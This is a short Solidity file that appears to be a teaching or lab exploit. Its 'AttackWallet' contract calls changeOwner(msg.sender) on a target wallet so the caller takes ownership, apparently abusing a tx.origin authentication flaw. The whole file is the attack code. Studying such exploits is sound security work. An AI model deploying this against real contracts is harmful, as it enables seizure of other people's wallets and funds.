// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface TxUserWallet {
    function changeOwner(address _owner) external;
}

contract AttackWallet {
     TxUserWallet contractOriginal;

    constructor(address _contract) public {
       contractOriginal = TxUserWallet(_contract);
    }

    function changeOwnerHack() public  {
        contractOriginal.changeOwner(msg.sender);
    }
}